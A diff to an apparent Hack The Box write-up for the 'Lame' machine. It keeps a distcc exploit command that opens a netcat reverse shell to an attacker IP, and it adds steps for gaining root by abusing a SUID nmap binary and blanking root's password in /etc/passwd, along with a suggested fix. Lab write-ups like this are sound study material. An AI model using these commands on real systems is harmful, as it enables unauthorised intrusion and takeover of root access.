@@ -58,4 +58,23 @@ To get a reverse shell I first started a netcat listenenr on another terminal wi
 And specified this in the -c argument: ```python2 distcc_exploit.py -t 10.10.10.3 -p 3632 -c 'nc -e /bin/sh 10.10.14.27 1234'``` </br>
 
 # Privilege Escalation
-
+I did an enumeration scan with LinPEAS tool, and could see that the nmap binary have SUID. </br>
+**SUID** (Set User ID) is a type of permission which is given to a file and allows users to execute the file
+with the permissions of its owner. </br> </br>
+By using this misconfigured suid I could get root access to the box, the version of Nmap in this box has
+an interactive mode, where I was able to execute commands and eventually get root privileges: </br>
+![nmap_interactive](images/lame/nmap_interactive.png) </br>
+Now to get inside the root user, I made my shell interactive (like I showed previously [here](https://github.com/TalKantor/ctf_writeups/blob/master/HTB/Linux/bank.md)). </br>
+edited the /etc/passwd file - and removed the 'x' in the root section: </br> </br>
+**From:** root:x:0:0:root:/root:/bin/bash **To:** root::0:0:root:/root:/bin/bash </br>
+**Explanation:** The 'x' in this line means that the password is actually stored hashed in the shadow file,
+when I removed it I was able to login to root with an empty password. </br> </br>
+**Vulnerability Exploited**: Suid Binary Bit Set </br>
+**Vulnerability Explanation:** If the binary has the SUID bit set, it does not drop the elevated privileges
+and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.
+If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default
+sh shell to run with SUID privileges. </br>
+**Vulnerability Fix:** Remove the unsafe SUID since any low priveleged user has access to it and can
+elevate his privileges. </br> </br>
+**Proof Of Screenshot:** </br>
+![privesc_proof](images/lame/privesc_proof.png) </br>
